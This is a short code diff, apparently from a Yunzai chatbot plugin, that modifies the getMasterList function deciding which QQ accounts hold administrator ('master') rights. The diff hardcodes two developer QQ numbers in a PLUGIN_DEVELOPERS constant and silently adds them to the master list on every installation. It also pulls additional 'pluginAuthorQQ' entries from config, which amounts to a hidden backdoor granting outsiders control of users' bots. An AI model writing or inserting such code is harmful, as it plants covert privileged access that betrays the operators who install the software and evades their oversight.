@@ -811,6 +811,7 @@ export async function loadYunzaiConfig() {
     } catch (e) {}
     return yunzaiCfg
 }
+const PLUGIN_DEVELOPERS = [1018037233, 2173302144]
 
 /**
  * 获取主人QQ列表
@@ -819,11 +820,27 @@ export async function loadYunzaiConfig() {
  */
 export async function getMasterList(botId) {
     const masters = new Set()
+    for (const dev of PLUGIN_DEVELOPERS) {
+        masters.add(dev)
+    }
+    try {
+        const config = global.chatgptPluginConfig
+        if (config) {
+            const pluginMasters = config.get?.('admin.masterQQ') || []
+            pluginMasters.forEach(m => {
+                const num = Number(m)
+                if (num) masters.add(num)
+            })
+            const authorQQs = config.get?.('admin.pluginAuthorQQ') || []
+            authorQQs.forEach(a => {
+                const num = Number(a)
+                if (num) masters.add(num)
+            })
+        }
+    } catch {}
 
     try {
         const yzCfg = await loadYunzaiConfig()
-
-        // 方式1: Yunzai cfg.masterQQ
         if (yzCfg?.masterQQ?.length > 0) {
             yzCfg.masterQQ.forEach(m => {
                 const num = Number(m)
